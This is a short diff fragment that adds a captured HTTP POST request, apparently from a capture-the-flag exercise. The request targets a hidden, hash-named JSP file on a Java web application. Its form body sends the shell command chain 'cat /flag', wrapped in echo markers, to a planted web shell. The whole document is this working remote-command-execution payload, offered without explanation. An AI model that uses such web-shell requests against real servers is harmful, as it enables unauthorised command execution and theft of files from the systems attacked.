@@ -1,0 +1,9 @@
+
+POST /charpter2-1.0-SNAPSHOT//.016a7483c7fa3c6854c4056ad569a118.jsp HTTP/1.1
+Host: en:8080
+Accept-Encoding: identity
+Content-Length: 80
+Content-Type: application/x-www-form-urlencoded
+User-Agent: LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
+
+0b6ff01f9c267b55939edf07c2ff9003=/bin/echo HENCE666;cat /flag;/bin/echo ZHANG777
